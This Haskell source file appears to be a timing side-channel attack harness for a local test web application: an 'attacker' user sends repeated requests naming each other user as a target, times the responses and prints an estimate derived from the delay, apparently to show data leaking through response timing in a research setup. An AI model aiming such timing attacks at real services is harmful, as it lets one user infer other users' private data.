import Data.Functor
import Control.Exception
import Control.Concurrent
import Control.Monad
import Network.HTTP
--import System.CPUTime.Rdtsc
import System.Posix.Clock
import Data.List
import Util
import Config

main = timedMain $ do
    let attacker = 1
        users    = [1..n]
    forM_ (attacker `delete` users) $ \target -> do 
      attack attacker target
    where n = databaseSize
          mkU u = "user"++ show u
          mkReq attacker target = do
            let url = "http://localhost:8000/app2"
                      ++ "?user=" ++ mkU attacker
                      ++ "&attack=" ++ mkU target
            simpleHTTP (getRequest url)
          attack attacker target = do
            res <- forM [1..10] $ \_ -> do
              t1 <- getTStamp -- rdtsc
              r <- mkReq attacker target 
              t2 <- getTStamp
              let delta :: Integer    
                  delta = fromIntegral $(t2-t1)
              return (delta,r)
            let ds = map fst res
                r  = head $ map snd res
                avg_d = sum ds `div` (fromIntegral $ length ds)
                estimate = (avg_d `div` 200000) `div` (fromIntegral n) -- delta
            putStrLn $ show target
                       ++ " : " ++ (show estimate)
            (take 100) <$> (getResponseBody r)

{-
getTStamp :: IO Integer
getTStamp = do
  (TimeSpec s n) <- getTime Monotonic
  return $ (secToNano (fromIntegral s))  + (fromIntegral n)

-- | Convert seconds to nanoseconds.
secToNano :: Integer -> Integer
secToNano = (1000000000*)
-}
